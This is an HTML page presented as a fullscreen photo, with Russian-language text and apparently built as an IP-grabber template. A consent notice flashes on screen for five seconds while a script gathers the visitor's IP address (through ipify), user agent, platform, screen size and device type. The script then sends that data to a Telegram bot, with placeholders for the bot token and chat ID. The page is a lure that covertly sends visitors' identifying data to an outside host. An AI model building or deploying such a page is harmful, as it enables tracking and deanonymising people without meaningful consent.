<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Фото</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            background-color: black;
        }
        .fullscreen-image {
            width: 100vw;
            height: 100vh;
            object-fit: cover;
        }
        .notification {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            font-family: Arial, sans-serif;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <img class="fullscreen-image" src="https://i.pinimg.com/564x/a2/36/20/a23620bbf4143ab4b90a462e59c25dad.jpg" alt="Fullscreen Image">
    
    <div class="notification" id="notification">
        Используя этот сайт, вы соглашаетесь с обработкой технических данных
    </div>

    <script>
        // Убираем уведомление через 5 секунд
        setTimeout(() => {
            document.getElementById('notification').style.display = 'none';
        }, 5000);

        // Собираем основную информацию
        const userInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
            date: new Date().toISOString()
        };

        // Получаем IP и отправляем данные в Telegram
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                userInfo.ip = data.ip;
                
                // Отправка данных в Telegram бота (замените YOUR_BOT_TOKEN и YOUR_CHAT_ID)
                const botToken = 'YOUR_BOT_TOKEN';
                const chatId = 'YOUR_CHAT_ID';
                const message = `Новый посетитель:\nIP: ${userInfo.ip}\nUser Agent: ${userInfo.userAgent}\nPlatform: ${userInfo.platform}\nScreen: ${userInfo.screen}\nMobile: ${userInfo.isMobile}\nTime: ${userInfo.date}`;
                
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
            })
            .catch(error => console.error('Error:', error));
    </script>
</body>
</html>
